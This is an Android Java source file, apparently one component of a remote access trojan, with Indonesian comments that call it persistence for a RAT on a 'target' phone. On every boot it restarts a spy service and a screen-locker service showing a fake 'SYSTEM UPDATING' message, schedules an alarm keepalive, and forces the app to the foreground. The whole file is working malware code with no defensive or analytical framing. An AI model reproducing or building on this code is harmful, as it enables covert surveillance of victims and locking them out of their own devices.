package com.nullx.pp;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

/**
 * BootReceiver: Sirkuit Auto-Start.
 * Memastikan RAT tetap aktif setelah HP target Restart.
 * Terintegrasi dengan sistem SharedPreferences untuk pemulihan state.
 */
public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "NXOB_BOOT";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        // Mengecek apakah sinyal yang masuk adalah Boot Completed atau Quick Boot (untuk chipset tertentu)
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(action) ||
            "com.htc.intent.action.QUICKBOOT_POWERON".equals(action)) {
            
            Log.d(TAG, "Target Device Rebooted. Re-activating Arsenal...");

            // 0. Ambil State Terakhir dari Storage
            SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String lastMsg = prefs.getString("last_lock_msg", "SYSTEM UPDATING... PLEASE WAIT");
            String lastMode = prefs.getString("last_lock_mode", "NORMAL");

            // 1. Menghidupkan Kembali Layar Kunci (Persistence)
            Intent lockIntent = new Intent(context, LockService.class);
            lockIntent.putExtra("mode", lastMode); 
            lockIntent.putExtra("message", lastMsg);
            
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(lockIntent);
                } else {
                    context.startService(lockIntent);
                }
            } catch (Exception e) {
                Log.e(TAG, "LockService auto-start failed: " + e.getMessage());
            }

            // 2. Menghidupkan Kembali Service Mata-Mata (SpyService)
            Intent spyIntent = new Intent(context, SpyService.class);
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(spyIntent);
                } else {
                    context.startService(spyIntent);
                }
            } catch (Exception e) {
                Log.e(TAG, "SpyService auto-start failed: " + e.getMessage());
            }

            // 3. Schedule AlarmManager keepalive sebagai jaring pengaman
            scheduleAlarmKeepalive(context);
            
            // 4. Memaksa MainActivity Terbuka (Wakeup / Foreground Hijack)
            // Di Android 10+, ini hanya bekerja jika izin "Display over other apps" sudah diberikan
            Intent activityIntent = new Intent(context, MainActivity.class);
            activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                                   Intent.FLAG_ACTIVITY_REORDER_TO_FRONT |
                                   Intent.FLAG_ACTIVITY_CLEAR_TOP);
            
            try {
                context.startActivity(activityIntent);
                Log.d(TAG, "MainActivity brought to front after boot.");
            } catch (Exception e) {
                Log.w(TAG, "Activity wakeup blocked by OS. Use service overlay instead.");
            }
        }
    }

    private void scheduleAlarmKeepalive(Context context) {
        try {
            AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent("RestartSpyService");
            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT :
                PendingIntent.FLAG_UPDATE_CURRENT;
            PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, flags);
            am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 60000, pi);
            Log.d(TAG, "[+] Alarm keepalive scheduled after boot (60s)");
        } catch (Exception e) {
            Log.w(TAG, "[-] Alarm keepalive after boot failed: " + e.getMessage());
        }
    }
}